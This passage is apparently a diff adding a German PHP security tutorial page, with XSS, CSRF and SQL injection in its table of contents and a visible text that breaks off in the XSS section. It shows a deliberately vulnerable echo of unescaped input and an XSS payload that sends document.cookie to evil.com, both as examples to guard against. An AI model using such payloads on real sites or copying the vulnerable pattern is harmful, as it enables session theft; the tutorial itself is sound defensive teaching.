@@ -1,0 +1,2414 @@
+<!DOCTYPE html><html lang="de"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="PHP Sicherheit: Wie du deine PHP-Anwendungen gegen die häufigsten Angriffe schützt – XSS, SQL Injection, CSRF, Session-Hijacking und mehr. Praktische Beispiele mit sicherem Code.">
+    <meta name="keywords" content="HTML, CSS, JavaScript, PHP, Bootstrap, Webentwicklung, DevPanicZone, Tutorials">
+    <meta name="author" content="DevPanicZone">
+    <title>PHP Sicherheit – Angriffe verstehen und abwehren | DevPanicZone</title>
+    <link rel="icon" type="image/svg+xml" href="/assets/icons/favicon.svg">
+    <link rel="icon" type="image/png" href="/assets/icons/favicon.png">
+    <link rel="stylesheet" href="/assets/css/style.css">
+    <link rel="stylesheet" href="/assets/css/tutorials.css">
+    <link rel="stylesheet" href="/assets/css/sidebar.css">
+    <link rel="stylesheet" href="/assets/vendor/prism/prism.css">
+</head>
+
+<body>
+    <!-- Header-Start -->
+<header class="site-header">
+    <div class="container">
+        <div class="header-content">
+            <div class="brand">
+                <a href="/" class="brand-link">
+                    <img src="/assets/icons/logo.svg" alt="DevPanicZone Logo" class="logo-icon">
+                    <span class="brand-name">DevPanicZone! Cheatsheets.</span>
+                </a>
+            </div>
+
+            <button class="theme-toggle" id="themeToggle" aria-label="Dark Mode umschalten">
+                <span class="theme-icon">
+                    <img src="/assets/icons/dark-mode.svg" alt="Icon Dark Mode" width="20" height="20">
+                </span>
+            </button>
+
+            <button class="mobile-menu-toggle" id="mobileMenuToggle" aria-label="Menü öffnen">
+                <span class="hamburger"></span>
+            </button>
+
+            <nav class="main-nav" id="mainNav" aria-label="Navigation">
+                <ul class="nav-list">
+                    <li><a href="/" class="nav-link">Home</a></li>
+                    <li class="nav-item-dropdown">
+                        <button class="nav-link dropdown-toggle" aria-expanded="false">
+                            Tutorials
+                            <span class="dropdown-icon">▾</span>
+                        </button>
+                        <ul class="dropdown-menu">
+                            <!-- Main-Nav-Start -->
+                                <li class="nav-item-nested">
+                        <a href="/tutorials/html/" class="nav-link">
+                            HTML
+                            <span class="submenu-icon">▸</span>
+                        </a>
+                        <ul class="dropdown-submenu">
+                            <li><a href="/tutorials/html/#html-basics">HTML Basics</a></li>
+                            <li><a href="/tutorials/html/#html-advanced">HTML Advanced</a></li>
+                        </ul>
+                    </li>
+                                <li class="nav-item-nested">
+                        <a href="/tutorials/css/" class="nav-link">
+                            CSS
+                            <span class="submenu-icon">▸</span>
+                        </a>
+                        <ul class="dropdown-submenu">
+                            <li><a href="/tutorials/css/#css-basics">CSS Basics</a></li>
+                        </ul>
+                    </li>
+                                <li class="nav-item-nested">
+                        <a href="/tutorials/javascript/" class="nav-link">
+                            JavaScript
+                            <span class="submenu-icon">▸</span>
+                        </a>
+                        <ul class="dropdown-submenu">
+                            <li><a href="/tutorials/javascript/#javascript-basics">JavaScript Basics</a></li>
+                            <li><a href="/tutorials/javascript/#javascript-projects">JavaScript Projects</a></li>
+                        </ul>
+                    </li>
+                                <li class="nav-item-nested">
+                        <a href="/tutorials/php/" class="nav-link">
+                            PHP
+                            <span class="submenu-icon">▸</span>
+                        </a>
+                        <ul class="dropdown-submenu">
+                            <li><a href="/tutorials/php/#php-basics">PHP Basics</a></li>
+                        </ul>
+                    </li>
+                                <li class="nav-item-nested">
+                        <a href="/tutorials/misc/" class="nav-link">
+                            Verschiedenes
+                            <span class="submenu-icon">▸</span>
+                        </a>
+                        <ul class="dropdown-submenu">
+                            <li><a href="/tutorials/misc/#tools">Tools</a></li>
+                            <li><a href="/tutorials/misc/#projects">Projects</a></li>
+                            <li><a href="/tutorials/misc/#web">Web</a></li>
+                        </ul>
+                    </li>
+                                <li class="nav-item-nested">
+                        <a href="/tutorials/documentation/" class="nav-link">
+                            DevPanicZone!
+                            <span class="submenu-icon">▸</span>
+                        </a>
+                        <ul class="dropdown-submenu">
+                            <li><a href="/tutorials/documentation/#devpaniczone">DevPanicZone</a></li>
+                        </ul>
+                    </li>
+                                <!-- Main-Nav-End -->
+                        </ul>
+                    </li>
+                    <li><a href="/glossary.html" class="nav-link">Glossar</a></li>
+                    
+                    <!-- Search Toggle -->
+                    <li>
+                        <button class="nav-link search-toggle" id="searchToggle" aria-label="Suche öffnen">
+                            <svg class="search-icon-nav" viewBox="0 0 23.25 28.09" aria-hidden="true">
+                                <path d="M23.25,11.62c0,2.56-.83,4.93-2.24,6.86l7.07,7.08c.7.7.7,1.83,0,2.53-.7.7-1.83.7-2.53,0l-7.07-7.08c-1.92,1.41-4.29,2.24-6.86,2.24C5.2,23.25,0,18.04,0,11.62S5.2,0,11.62,0s11.62,5.2,11.62,11.62ZM11.62,19.67c4.44,0,8.05-3.6,8.05-8.05S16.07,3.58,11.62,3.58,3.58,7.18,3.58,11.62s3.6,8.05,8.05,8.05Z"/>
+                            </svg>
+                        </button>
+                    </li>
+                </ul>
+                
+                <!-- Search Dropdown -->
+                <div class="search-dropdown" id="searchDropdown" hidden>
+                    <div class="search-input-group">
+                        <svg class="search-icon" viewBox="0 0 23.25 28.09" aria-hidden="true">
+                            <path d="M23.25,11.62c0,2.56-.83,4.93-2.24,6.86l7.07,7.08c.7.7.7,1.83,0,2.53-.7.7-1.83.7-2.53,0l-7.07-7.08c-1.92,1.41-4.29,2.24-6.86,2.24C5.2,23.25,0,18.04,0,11.62S5.2,0,11.62,0s11.62,5.2,11.62,11.62ZM11.62,19.67c4.44,0,8.05-3.6,8.05-8.05S16.07,3.58,11.62,3.58,3.58,7.18,3.58,11.62s3.6,8.05,8.05,8.05Z"/>
+                        </svg>
+                        <input 
+                            type="search" 
+                            id="globalSearch" 
+                            class="search-input" 
+                            placeholder="Tutorials durchsuchen..."
+                            aria-label="Suche">
+                        <kbd class="search-shortcut" aria-hidden="true">/</kbd>
+                    </div>
+                    
+                    <div class="search-results" id="searchResults" hidden>
+                        <div class="search-results-list" id="searchResultsList"></div>
+                        <div class="search-results-footer">
+                            <button class="search-view-all" id="searchViewAll">
+                                Alle Ergebnisse anzeigen →
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </nav>
+        </div>
+    </div>
+</header>
+<!-- Header-End -->
+
+    <main class="site-main">
+
+        <!-- Hero -->
+        <section class="hero tutorial-hero">
+            <div class="container">
+                <nav class="breadcrumbs"><a href="/" class="breadcrumb-link">Home</a><span class="breadcrumb-separator">›</span><a href="/tutorials/php/" class="breadcrumb-link">PHP</a><span class="breadcrumb-separator">›</span><span class="breadcrumb-current">PHP Sicherheit</span></nav>
+                <h1 class="hero-title">PHP Sicherheit</h1>
+                <p class="hero-subtitle">Schütze deine Anwendungen vor den häufigsten Angriffen. Verstehen, erkennen,
+                    abwehren.</p>
+            </div>
+        </section>
+
+        <!-- Floating Button Links (Sidebar) -->
+        <button class="sidebar-toggle" id="sidebarToggle" aria-label="Inhaltsverzeichnis öffnen" title="Auf dieser Seite">
+            <span class="toggle-icon">☰</span>
+        </button>
+
+        <!-- Floating Button Rechts (Tutorial Navigation) -->
+        <button class="tutorial-nav-toggle" id="tutorialNavToggle" aria-label="Tutorial Navigation öffnen">
+            <span class="toggle-icon">
+                <img src="/assets/icons/library.svg" alt="Library Icon" class="library-icon">
+            </span>
+        </button>
+
+        <!-- Sidebar Overlay für Mobile -->
+        <div class="sidebar-overlay" id="sidebarOverlay"></div>
+
+        <!-- Tutorial Layout -->
+        <div class="tutorial-layout">
+
+            <!-- Linke Sidebar (Floating Panel) -->
+            <aside class="tutorial-sidebar" id="tutorialSidebar">
+                <div class="sidebar-header">
+                    <h3 class="sidebar-title no-toc">Auf dieser Seite</h3>
+                    <button class="sidebar-close" id="sidebarClose" aria-label="Schließen">
+                        <span>×</span>
+                    </button>
+                </div>
+
+                <nav class="sidebar-toc" aria-label="Inhaltsverzeichnis">
+                    <ul class="toc-list">
+                        <!-- Sidebar-Anchor-Start -->
+                    <li class="toc-level-1"><a href="#warum-ist-php-sicherheit-so-wichtig">Warum ist PHP-Sicherheit so wichtig?</a></li>
+                    <li class="toc-level-2"><a href="#die-owasp-top-10">Die OWASP Top 10</a></li>
+                    <li class="toc-level-1"><a href="#cross-site-scripting-xss">Cross-Site Scripting (XSS)</a></li>
+                    <li class="toc-level-2"><a href="#wie-funktioniert-xss">Wie funktioniert XSS?</a></li>
+                    <li class="toc-level-2"><a href="#schutz-vor-xss-htmlspecialchars">Schutz vor XSS: htmlspecialchars()</a></li>
+                    <li class="toc-level-2"><a href="#was-macht-htmlspecialchars">Was macht htmlspecialchars()?</a></li>
+                    <li class="toc-level-2"><a href="#helper-funktion-fuer-schnelleren-zugriff">Helper-Funktion für schnelleren Zugriff</a></li>
+                    <li class="toc-level-2"><a href="#xss-in-verschiedenen-kontexten">XSS in verschiedenen Kontexten</a></li>
+                    <li class="toc-level-2"><a href="#content-security-policy-csp">Content Security Policy (CSP)</a></li>
+                    <li class="toc-level-1"><a href="#sql-injection-der-klassiker">SQL Injection – Der Klassiker</a></li>
+                    <li class="toc-level-2"><a href="#wie-funktioniert-sql-injection">Wie funktioniert SQL Injection?</a></li>
+                    <li class="toc-level-2"><a href="#schutz-vor-sql-injection-prepared-statements">Schutz vor SQL Injection: Prepared Statements</a></li>
+                    <li class="toc-level-2"><a href="#verschiedene-bind-methoden">Verschiedene Bind-Methoden</a></li>
+                    <li class="toc-level-2"><a href="#was-du-nicht-mit-prepared-statements-machen-kannst">Was du NICHT mit Prepared Statements machen kannst</a></li>
+                    <li class="toc-level-2"><a href="#connection-setup-in-separater-datei">Connection-Setup in separater Datei</a></li>
+                    <li class="toc-level-1"><a href="#cross-site-request-forgery-csrf">Cross-Site Request Forgery (CSRF)</a></li>
+                    <li class="toc-level-2"><a href="#wie-funktioniert-csrf">Wie funktioniert CSRF?</a></li>
+                    <li class="toc-level-2"><a href="#schutz-vor-csrf-tokens">Schutz vor CSRF: Tokens</a></li>
+                    <li class="toc-level-2"><a href="#zusaetzlicher-schutz-samesite-cookie-attribut">Zusätzlicher Schutz: SameSite-Cookie-Attribut</a></li>
+                    <li class="toc-level-1"><a href="#session-sicherheit">Session-Sicherheit</a></li>
+                    <li class="toc-level-2"><a href="#session-hijacking">Session Hijacking</a></li>
+                    <li class="toc-level-2"><a href="#sichere-session-konfiguration">Sichere Session-Konfiguration</a></li>
+                    <li class="toc-level-2"><a href="#komplettes-login-system-mit-security">Komplettes Login-System mit Security</a></li>
+                    <li class="toc-level-2"><a href="#session-validieren-bei-jedem-request">Session validieren bei jedem Request</a></li>
+                    <li class="toc-level-2"><a href="#sicherer-logout">Sicherer Logout</a></li>
+                    <li class="toc-level-1"><a href="#passwort-sicherheit">Passwort-Sicherheit</a></li>
+                    <li class="toc-level-2"><a href="#passwoerter-niemals-im-klartext-speichern">Passwörter NIEMALS im Klartext speichern</a></li>
+                    <li class="toc-level-2"><a href="#passwoerter-richtig-hashen">Passwörter richtig hashen</a></li>
+                    <li class="toc-level-2"><a href="#passwort-verifikation">Passwort-Verifikation</a></li>
+                    <li class="toc-level-2"><a href="#passwort-anforderungen">Passwort-Anforderungen</a></li>
+                    <li class="toc-level-2"><a href="#brute-force-schutz-rate-limiting">Brute-Force-Schutz: Rate Limiting</a></li>
+                    <li class="toc-level-1"><a href="#file-upload-sicherheit">File Upload Sicherheit</a></li>
+                    <li class="toc-level-2"><a href="#die-gefahren">Die Gefahren</a></li>
+                    <li class="toc-level-2"><a href="#sicherer-file-upload">Sicherer File-Upload</a></li>
+                    <li class="toc-level-2"><a href="#upload-verzeichnis-schuetzen">Upload-Verzeichnis schützen</a></li>
+                    <li class="toc-level-2"><a href="#zusaetzliche-sicherheitsmassnahmen">Zusätzliche Sicherheitsmaßnahmen</a></li>
+                    <li class="toc-level-1"><a href="#error-handling-und-information-disclosure">Error Handling und Information Disclosure</a></li>
+                    <li class="toc-level-2"><a href="#was-du-nicht-tun-solltest">Was du NICHT tun solltest</a></li>
+                    <li class="toc-level-2"><a href="#richtige-fehlerbehandlung">Richtige Fehlerbehandlung</a></li>
+                    <li class="toc-level-2"><a href="#custom-error-handler">Custom Error Handler</a></li>
+                    <li class="toc-level-2"><a href="#login-fehler-richtig-machen">Login-Fehler richtig machen</a></li>
+                    <li class="toc-level-1"><a href="#security-headers">Security Headers</a></li>
+                    <li class="toc-level-2"><a href="#wichtige-security-headers">Wichtige Security Headers</a></li>
+                    <li class="toc-level-2"><a href="#header-bedeutungen-im-detail">Header-Bedeutungen im Detail</a></li>
+                    <li class="toc-level-1"><a href="#security-checkliste">Security-Checkliste</a></li>
+                    <li class="toc-level-2"><a href="#input-validierung-output-encoding">Input-Validierung &amp; Output-Encoding</a></li>
+                    <li class="toc-level-2"><a href="#authentication-sessions">Authentication &amp; Sessions</a></li>
+                    <li class="toc-level-2"><a href="#input-validierung-output-encoding-1">Input-Validierung &amp; Output-Encoding</a></li>
+                    <li class="toc-level-2"><a href="#authentication-sessions-1">Authentication &amp; Sessions</a></li>
+                    <li class="toc-level-2"><a href="#csrf-schutz">CSRF-Schutz</a></li>
+                    <li class="toc-level-2"><a href="#file-uploads">File Uploads</a></li>
+                    <li class="toc-level-2"><a href="#configuration">Configuration</a></li>
+                    <li class="toc-level-2"><a href="#database">Database</a></li>
+                    <li class="toc-level-2"><a href="#best-practices">Best Practices</a></li>
+                    <li class="toc-level-1"><a href="#zusammenfassung">Zusammenfassung</a></li>
+                    <li class="toc-level-2"><a href="#die-haeufigsten-fehler">Die häufigsten Fehler</a></li>
+                    <li class="toc-level-2"><a href="#das-security-mindset">Das Security-Mindset</a></li>
+                    <!-- Sidebar-Anchor-End -->
+                    </ul>
+                </nav>
+            </aside>
+
+            <!-- Rechte Sidebar (Floating Panel) -->
+            <aside class="tutorial-related">
+                <div class="sidebar-header">
+                    <h3 class="sidebar-title no-toc">Tutorials</h3>
+                    <button class="sidebar-close" id="tutorialNavClose" aria-label="Schließen">
+                        <span>×</span>
+                    </button>
+                </div>
+
+                <div class="sidebar-nav">
+                    <ul class="sidebar-nav-list">
+                    <li class="sidebar-group-title">PHP Basics</li>
+                    <li><a href="/tutorials/php/php-basics/php-basics.html">PHP Basics – Die Grundlagen</a></li>
+                    <li><a href="/tutorials/php/php-basics/php-security.html" class="active">PHP Sicherheit</a></li>
+                </ul>
+                </div>
+            </aside>
+
+            <!-- Wrapper .container -->
+            <div class="container">
+
+                <!-- Intro  -->
+                <section class="tutorials-content mt-xl">
+                    <h2 id="warum-ist-php-sicherheit-so-wichtig">Warum ist PHP-Sicherheit so wichtig?</h2>
+                    <p>PHP-Anwendungen sind ein beliebtes Ziel für Angreifer – nicht weil PHP unsicher ist, sondern weil
+                        es so weit verbreitet ist und viele Entwickler Sicherheitsaspekte unterschätzen oder nicht
+                        kennen.</p>
+                    <div class="info-box warning">
+                        <strong class="box-title warning no-toc">Die Realität
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,
+                15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM14.35,4.75h1.71c.6,
+                0,1.07.49,1.06,1.09l-.35,12.32c-.02.57-.48,1.03-1.06,1.03h-.98c-.57,
+                0-1.04-.45-1.06-1.02l-.38-12.32c-.02-.6.46-1.09,1.06-1.09ZM16.7,
+                25.2c-.39.37-.88.55-1.46.55s-1.04-.18-1.44-.55c-.39-.37-.59-.81-.59-1.33s.2-.95.59-1.32c.4-.37.88-.55,
+                1.44-.55s1.07.18,1.46.55c.39.37.59.81.59,1.32s-.2.96-.59,1.33Z"></path>
+                            </svg>
+                        </strong>
+                        <p>Ein einziger Sicherheitsfehler kann ausreichen, um:</p>
+                        <ul class="arrow-list">
+                            <li>Deine gesamte Datenbank zu kompromittieren</li>
+                            <li>Nutzerdaten zu stehlen</li>
+                            <li>Deine Website zu manipulieren</li>
+                            <li>Deine Server zu übernehmen</li>
+                            <li>Malware zu verbreiten</li>
+                        </ul>
+                        <p class="pt-md"><strong>Sicherheit ist kein Feature – es ist eine Grundvoraussetzung.</strong>
+                        </p>
+                    </div>
+
+                    <h3 id="die-owasp-top-10">Die OWASP Top 10</h3>
+                    <p>Die <strong>Open Web Application Security Project (OWASP)</strong> veröffentlicht regelmäßig die
+                        häufigsten Sicherheitsprobleme. In diesem Tutorial behandeln wir die wichtigsten davon:</p>
+
+                    <div class="grid-2col grid-2col-bg">
+                        <div>
+                            <ul class="arrow-list">
+                                <li><strong>Injection</strong> (SQL Injection, Command Injection)</li>
+                                <li><strong>Broken Authentication</strong> (Session-Management, Passwörter)</li>
+                                <li><strong>Cross-Site Scripting (XSS)</strong></li>
+                                <li><strong>Insecure Direct Object References</strong></li>
+                            </ul>
+                        </div>
+                        <div>
+                            <ul class="arrow-list">
+                                <li><strong>Security Misconfiguration</strong></li>
+                                <li><strong>Cross-Site Request Forgery (CSRF)</strong></li>
+                                <li><strong>File Upload Vulnerabilities</strong></li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="info-box">
+                        <strong class="box-title no-toc">Security-Mindset
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM15.56,3.83c1.22,0,2.21.99,2.21,2.21s-.99,2.21-2.21,2.21-2.21-.99-2.21-2.21.99-2.21,2.21-2.21ZM18.51,25.93h-5.9c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h1.47v-8.84h-1.47c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h2.95c.82,0,1.47.66,1.47,1.47v10.32h1.47c.82,0,1.47.66,1.47,1.47s-.66,1.47-1.47,1.47Z"></path>
+                            </svg>
+                        </strong>
+                        <p><strong>Vertraue niemals Nutzereingaben!</strong> Das ist die goldene Regel. Alles, was von
+                            außen kommt – Formulare, URLs, Cookies, HTTP-Header – kann manipuliert sein. Immer
+                            validieren, immer bereinigen, immer überprüfen.</p>
+                    </div>
+
+                </section>
+
+                <!-- XSS -->
+                <section class="tutorials-content">
+                    <h2 id="cross-site-scripting-xss">Cross-Site Scripting (XSS)</h2>
+                    <p>XSS ist einer der häufigsten Angriffe. Dabei schleust ein Angreifer schädlichen JavaScript-Code
+                        in deine Website ein, der dann im Browser anderer Nutzer ausgeführt wird.</p>
+
+                    <h3 id="wie-funktioniert-xss">Wie funktioniert XSS?</h3>
+                    <p>Stell dir vor, du hast ein Kommentarfeld ohne Sicherheitsmaßnahmen:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">GEFÄHRLICH - NIEMALS SO!</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" class="icon-danger" fill="currentColor" role="img" aria-label="Falsch">
+                                <path d="M15.2,0C6.8,0,0,6.8,0,15.2s6.8,15.2,15.2,15.2,15.2-6.8,15.2-15.2S23.7,0,15.2,0ZM23.2,
+    20.7c.4.4.4,1,0,1.4l-1.1,1.1c-.4.4-1,.4-1.4,0l-5.5-5.5-5.5,5.5c-.4.4-1,.4-1.4,0l-1.1-1.1c-.4-.4-.4-1,
+    0-1.4l5.5-5.5-5.5-5.5c-.4-.4-.4-1,0-1.4l1.1-1.1c.4-.4,1-.4,1.4,0l5.5,5.5,5.5-5.5c.4-.4,1-.4,1.4,0l1.1,1.1c.4.4.4,1,0,1.4l-5.5,5.5,5.5,5.5Z">
+                                </path>
+                            </svg>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// GEFÄHRLICH - NIEMALS SO!
+$kommentar = $_POST['kommentar'];
+echo "&lt;p&gt;" . $kommentar . "&lt;/p&gt;";
+?&gt;</code></pre>
+                    </div>
+
+                    <p>Ein Angreifer könnte jetzt eingeben:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">Cookies stehlen und an Angreifer senden</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" class="icon-warning" fill="currentColor" role="img" aria-label="Achtung">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM14.35,4.75h1.71c.6,0,
+    1.07.49,1.06,1.09l-.35,12.32c-.02.57-.48,1.03-1.06,1.03h-.98c-.57,0-1.04-.45-1.06-1.02l-.38-12.32c-.02-.6.46-1.09,1.06-1.09ZM16.7,
+    25.2c-.39.37-.88.55-1.46.55s-1.04-.18-1.44-.55c-.39-.37-.59-.81-.59-1.33s.2-.95.59-1.32c.4-.37.88-.55,1.44-.55s1.07.18,1.46.55c.39.37.59.81.59,1.32s-.2.96-.59,1.33Z">
+                                </path>
+                            </svg>
+                        </div>
+                        <pre><code class="language-html">&lt;script&gt;
+    // Cookies stehlen und an Angreifer senden
+    fetch('https://evil.com/steal.php?cookie=' + document.cookie);
+&lt;/script&gt;</code></pre>
+                    </div>
+
+                    <p>Oder subtiler:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">Gehackt</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" class="icon-warning" fill="currentColor" role="img" aria-label="Achtung">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM14.35,4.75h1.71c.6,0,
+    1.07.49,1.06,1.09l-.35,12.32c-.02.57-.48,1.03-1.06,1.03h-.98c-.57,0-1.04-.45-1.06-1.02l-.38-12.32c-.02-.6.46-1.09,1.06-1.09ZM16.7,
+    25.2c-.39.37-.88.55-1.46.55s-1.04-.18-1.44-.55c-.39-.37-.59-.81-.59-1.33s.2-.95.59-1.32c.4-.37.88-.55,1.44-.55s1.07.18,1.46.55c.39.37.59.81.59,1.32s-.2.96-.59,1.33Z">
+                                </path>
+                            </svg>
+                        </div>
+                        <pre><code class="language-html">&lt;img src="x" onerror="alert('Gehackt!')"&gt;</code></pre>
+                    </div>
+
+                    <div class="info-box danger">
+                        <strong class="box-title danger no-toc" id="wichtig">Was kann ein Angreifer mit XSS machen?
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,
+                15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM14.35,4.75h1.71c.6,
+                0,1.07.49,1.06,1.09l-.35,12.32c-.02.57-.48,1.03-1.06,1.03h-.98c-.57,
+                0-1.04-.45-1.06-1.02l-.38-12.32c-.02-.6.46-1.09,1.06-1.09ZM16.7,
+                25.2c-.39.37-.88.55-1.46.55s-1.04-.18-1.44-.55c-.39-.37-.59-.81-.59-1.33s.2-.95.59-1.32c.4-.37.88-.55,
+                1.44-.55s1.07.18,1.46.55c.39.37.59.81.59,1.32s-.2.96-.59,1.33Z"></path>
+                            </svg>
+                        </strong>
+                        <ul class="arrow-list">
+                            <li>Session-Cookies stehlen und sich als Nutzer ausgeben</li>
+                            <li>Formulare manipulieren (z.B. Bankdaten umleiten)</li>
+                            <li>Nutzer auf Phishing-Seiten umleiten</li>
+                            <li>Tastatureingaben aufzeichnen (Keylogger)</li>
+                            <li>Die gesamte Seite manipulieren</li>
+                        </ul>
+                    </div>
+
+                    <h3 id="schutz-vor-xss-htmlspecialchars">Schutz vor XSS: htmlspecialchars()</h3>
+                    <p>Die Lösung ist einfach, aber <strong>du musst sie konsequent anwenden</strong>:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// SICHER
+$kommentar = $_POST['kommentar'] ?? '';
+echo "&lt;p&gt;" . htmlspecialchars($kommentar, ENT_QUOTES, 'UTF-8') . "&lt;/p&gt;";
+?&gt;</code></pre>
+                    </div>
+
+                    <h3 id="was-macht-htmlspecialchars">Was macht htmlspecialchars()?</h3>
+                    <p>Es wandelt gefährliche Zeichen in harmlose HTML-Entities um:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+$input = '&lt;script&gt;alert("XSS")&lt;/script&gt;';
+echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
+// Ausgabe: &lt;script&gt;alert("XSS")&lt;/script&gt;
+// Der Browser zeigt den Text an, führt ihn aber nicht aus!
+?&gt;</code></pre>
+                    </div>
+
+                    <div class="info-box">
+                        <strong class="box-title no-toc">Die drei Parameter im Detail
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM15.56,3.83c1.22,0,2.21.99,2.21,2.21s-.99,2.21-2.21,2.21-2.21-.99-2.21-2.21.99-2.21,2.21-2.21ZM18.51,25.93h-5.9c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h1.47v-8.84h-1.47c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h2.95c.82,0,1.47.66,1.47,1.47v10.32h1.47c.82,0,1.47.66,1.47,1.47s-.66,1.47-1.47,1.47Z"></path>
+                            </svg>
+                        </strong>
+                        <ul class="arrow-list">
+                            <li><code>ENT_QUOTES</code> – Wandelt auch einfache und doppelte Anführungszeichen um</li>
+                            <li><code>'UTF-8'</code> – Encoding (wichtig für Umlaute, Emojis etc.)</li>
+                            <li>Diese Kombination ist der Standard für sichere Ausgabe</li>
+                        </ul>
+                    </div>
+
+                    <h3 id="helper-funktion-fuer-schnelleren-zugriff">Helper-Funktion für schnelleren Zugriff</h3>
+                    <p>Damit du nicht jedes Mal die gleichen Parameter schreiben musst:</p>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// In functions.php oder am Anfang deiner Datei
+function esc(string $string): string {
+    return htmlspecialchars($string, ENT_QUOTES, 'UTF-8');
+}
+
+// Dann einfach:
+$name = $_POST['name'] ?? '';
+echo esc($name);
+?&gt;</code></pre>
+                    </div>
+
+                    <h3 id="xss-in-verschiedenen-kontexten">XSS in verschiedenen Kontexten</h3>
+
+                    <h4>In HTML-Attributen</h4>
+                    <div>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">PHP</span>
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" class="icon-success" fill="#20a66e" aria-hidden="true">
+                                    <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM24.85,10.96l-10.96,10.96c-.33.33-.76.49-1.19.49s-.86-.16-1.19-.49l-5.13-5.13c-.66-.66-.66-1.73,0-2.39.66-.66,1.73-.66,2.39,0l3.94,3.94,9.76-9.76c.66-.66,1.73-.66,2.39,0,.66.66.66,1.73,0,2.39Z">
+                                    </path>
+                                </svg>
+                                <!-- <button class="code-copy">
+                                    <span class="copy-icon">
+                                        <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                    </span>
+                                    <span class="copy-text">Kopieren</span>
+                                </button> -->
+                            </div>
+                            <pre><code class="language-php">&lt;?php
+$title = $_GET['title'] ?? '';
+
+// RICHTIG
+echo '&lt;div title="' . htmlspecialchars($title, ENT_QUOTES, 'UTF-8') . '"&gt;';
+?&gt;</code></pre>
+                        </div>
+                    </div>
+
+                    <h4>In JavaScript (extra vorsichtig!)</h4>
+
+                    <!-- Faslch -->
+                    <div class="mb-lg">
+                        <div class="code-block mb-xl">
+                            <div class="code-header">
+                                <span class="code-lang">GEFÄHRLICH</span>
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" class="icon-danger" fill="var(--accent-red)" aria-hidden="true">
+                                    <path d="M15.2,0C6.8,0,0,6.8,0,15.2s6.8,15.2,15.2,15.2,15.2-6.8,15.2-15.2S23.7,0,15.2,0ZM23.2,
+20.7c.4.4.4,1,0,1.4l-1.1,1.1c-.4.4-1,.4-1.4,0l-5.5-5.5-5.5,5.5c-.4.4-1,.4-1.4,0l-1.1-1.1c-.4-.4-.4-1,
+0-1.4l5.5-5.5-5.5-5.5c-.4-.4-.4-1,0-1.4l1.1-1.1c.4-.4,1-.4,1.4,0l5.5,5.5,5.5-5.5c.4-.4,1-.4,1.4,0l1.1,1.1c.4.4.4,1,0,1.4l-5.5,5.5,5.5,5.5Z">
+                                    </path>
+                                </svg>
+                            </div>
+                            <pre><code class="language-php">&lt;?php
+$username = $_SESSION['username'] ?? 'Gast';
+
+// GEFÄHRLICH
